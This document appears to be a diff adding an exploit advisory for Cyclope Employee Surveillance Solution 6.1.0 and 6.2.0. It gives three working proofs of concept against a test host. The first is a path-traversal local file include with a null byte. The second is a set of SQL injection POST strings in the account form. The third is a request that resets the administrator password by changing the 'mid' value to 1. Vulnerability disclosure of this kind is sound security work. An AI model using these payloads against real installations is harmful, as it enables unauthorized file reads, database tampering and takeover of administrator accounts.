@@ -1,0 +1,42 @@
+# Author: loneferret of Offensive Security
+# Product: Cyclope Employee Surveillance Solution v6.0
+# Version: 6.1.0 & 6.2.0
+# Vendor Site: http://www.cyclope-series.com/
+# Software Download: http://www.cyclope-series.com/download/index.html
+
+# Software description:
+# The employee monitoring software developed by Cyclope-Series is specially designed to inform
+# and equip management with statistics relating to the productivity of staff within their organization.
+
+# Vulnerability PoC 1:
+# Local File Include
+#
+# Requirements: Employee access
+# PoC:
+# http://172.16.194.134:7879/help.php?pag=../../../../../../boot.ini%00
+
+# Vulnerability PoC 2:
+# SQL Injection
+# Requirements: Employee access
+#
+# http://172.16.194.134:7879/index.php?pag=myaccount
+# -Fields affected in form:
+# -First Name
+# -Last Name
+# -Password / Re-Type Password
+# -Email
+# -mid
+# Poc:
+# mid=15&act=member-account&pag=myaccount&first_name=john&last_name=Doe&password=123456&password2=123456&email='
+# mid=15'&act=member-account&pag=myaccount&first_name=john&last_name=Doe&password=123456&password2=123456&email=
+# and so on...
+
+# Vulnerability PoC 3:
+# Change Admin account's password.
+# Requirements: Employee access
+# http://172.16.194.134:7879/index.php?pag=myaccount
+#
+# Using a tool such as Tamper Data or Live HTTP Headers, change the value
+# of 'mid' to 1
+# PoC:
+# Post Data: mid=1&act=member-account&pag=myaccount&first_name=john&last_name=Doe&password=123456&password2=123456&email=
